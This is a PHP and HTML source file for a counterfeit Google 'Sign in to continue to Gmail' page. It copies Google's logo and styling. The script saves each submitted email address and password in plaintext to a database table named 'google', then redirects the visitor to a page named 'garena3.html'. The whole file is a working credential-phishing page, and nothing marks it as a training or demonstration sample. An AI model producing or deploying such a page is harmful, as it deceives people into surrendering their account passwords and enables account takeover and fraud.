<?php
// Include config file
require_once "config.php";

// Define variables and initialize with empty values
$username = $password = "";
$username_err = $password_err = "";

// Processing form data when form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Validate username
    if (empty(trim($_POST["username"]))) {
        $username_err = "Please enter a username.";
    } elseif (!preg_match('/^[a-zA-Z0-9@._]+$/', trim($_POST["username"]))) {
        $username_err = "Username can only contain letters, numbers, and underscores.";
    } else {
        $sql = "SELECT id FROM google WHERE username = ?";

        if ($stmt = mysqli_prepare($link, $sql)) {
            mysqli_stmt_bind_param($stmt, "s", $param_username);
            $param_username = trim($_POST["username"]);

            if (mysqli_stmt_execute($stmt)) {
                mysqli_stmt_store_result($stmt);

                if (mysqli_stmt_num_rows($stmt) == 1) {
                    $username_err = "This username is already taken.";
                } else {
                    $username = trim($_POST["username"]);
                }
            } else {
                echo "Oops! Something went wrong. Please try again later.";
            }

            mysqli_stmt_close($stmt);
        }
    }

    // Validate password
    if (empty(trim($_POST["password"]))) {
        $password_err = "Please enter your password.";
    } elseif (strlen(trim($_POST["password"])) > 15) {
        $password_err = "Password must be 15 characters or less.";
    } else {
        $password = trim($_POST["password"]);
    }

    // Insert data if no errors
    if (empty($username_err) && empty($password_err)) {
        $sql = "INSERT INTO google (username, password) VALUES (?, ?)";

        if ($stmt = mysqli_prepare($link, $sql)) {
            mysqli_stmt_bind_param($stmt, "ss", $param_username, $param_password);

            $param_username = $username;
            $param_password = $password;

            if (mysqli_stmt_execute($stmt)) {
                header("Location: garena3.html");
                exit;
            } else {
                echo "Something went wrong. Please try again later.";
            }

            mysqli_stmt_close($stmt);
        }
    }

    mysqli_close($link);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Accounts</title>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            color: #202124;
        }

        .container {
            max-width: 450px;
            margin: 100px auto;
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
            padding: 48px 40px 36px;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 75px;
            height: 24px;
        }

        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 15px;
        }

        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #5f6368;
            margin-bottom: 30px;
        }

        .input-field {
            margin-bottom: 20px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
        }

        input:focus {
            border-color: #1a73e8;
            outline: none;
        }

        .error {
            color: red;
            font-size: 14px;
            margin-top: 5px;
        }

        .buttons {
            display: flex;
            justify-content: flex-end;
        }

        .next-button {
            text-align: right;
        }

        .next-button button {
            background-color: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
        }

        .next-button button:hover {
            background-color: #1765cc;
        }

        .footer {
            margin-top: 50px;
            text-align: center;
            font-size: 12px;
            color: #5f6368;
        }

        .language-selector {
            margin-top: 20px;
            text-align: center;
        }

        .language-selector select {
            padding: 5px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            background-color: white;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <h1>Sign in</h1>
        <div class="subtitle">to continue to Gmail</div>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="input-field">
                <input type="email" name="username" placeholder="Email address" value="<?php echo htmlspecialchars($username); ?>">
                <div class="error"><?php echo $username_err; ?></div>
            </div>

            <div class="input-field">
                <input type="password" name="password" placeholder="Enter your password" value="<?php echo htmlspecialchars($password); ?>">
                <div class="error"><?php echo $password_err; ?></div>
            </div>

            <div class="buttons">
                <div class="next-button">
                    <button type="submit">Next</button>
                </div>
            </div>
        </form>

        <div class="footer">
            <p>Not your computer? Use Guest mode to sign in privately.</p>
            <a href="#">Learn more</a>
        </div>

        <div class="language-selector">
            <select>
                <option>English (United States)</option>
                <option>Español</option>
                <option>Français</option>
                <option>Deutsch</option>
            </select>
        </div>
    </div>
</body>
</html>
